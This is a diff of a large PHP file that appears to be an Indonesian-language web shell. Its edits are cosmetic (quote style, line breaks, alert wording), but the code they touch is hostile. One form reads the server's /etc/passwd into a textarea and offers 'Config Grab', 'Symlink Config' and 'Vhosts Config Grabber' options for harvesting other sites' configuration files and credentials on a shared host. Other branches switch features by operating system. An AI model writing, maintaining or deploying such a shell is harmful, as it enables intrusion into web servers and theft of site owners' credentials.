@@ -1973,7 +1973,7 @@ case 'hex':
                                 }
 elseif ($_GET['do'] == 'configv2') {
     if (strtolower(substr(PHP_OS, 0, 3)) == 'win') {
-        echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
+        echo '<script>alert("Tidak bisa di gunakan di server Windows!")</script>';
         exit;
     }
 
@@ -2551,22 +2551,19 @@ elseif ($_GET['do'] == 'configv2') {
             }
         }
     } else {
-echo "<form method=\"post\" action=\"\">";
+echo "<form method='post' action=''>";
 echo "<center>";
-echo "<textarea name=\"passwd\" class=\"area\" rows=\"15\" cols=\"60\">";
+echo "<textarea name='passwd' class='area' rows='15' cols='60'>";
 echo include("/etc/passwd");
 echo "</textarea>";
-echo "
-";
-echo "<select class=\"select\" name=\"config\" style=\"width: 450px;\">";
-echo "<option value=\"grab\">Config Grab</option>";
-echo "<option value=\"symlink\">Symlink Config</option>";
-echo "<option value=\"404\">Config 404</option>";
-echo "<option value=\"symvhosts\">Vhosts Config Grabber</option>";
+echo "<br>";
+echo "<select class='select' name='config' style='width: 450px;'>";
+echo "<option value='grab'>Config Grab</option>";
+echo "<option value='symlink'>Symlink Config</option>";
+echo "<option value='404'>Config 404</option>";
+echo "<option value='symvhosts'>Vhosts Config Grabber</option>";
 echo "</select>";
-echo "
-";
-echo "<input type=\"submit\" value=\"Start!\">";
+echo "<input type='submit' value='Start!'>";
 echo "</center>";
 echo "</form>";
     }
@@ -5038,7 +5035,7 @@ if (strtolower(substr(PHP_OS, 0, 3)) === 'win') {
     }
 }
 else {
-    echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
+    echo "<script>alert('Fitur ini hanya dapat digunakan di Windows server!');window.location='?';</script>";
 }
 }
 elseif ($_GET['act'] == 'newfile') {
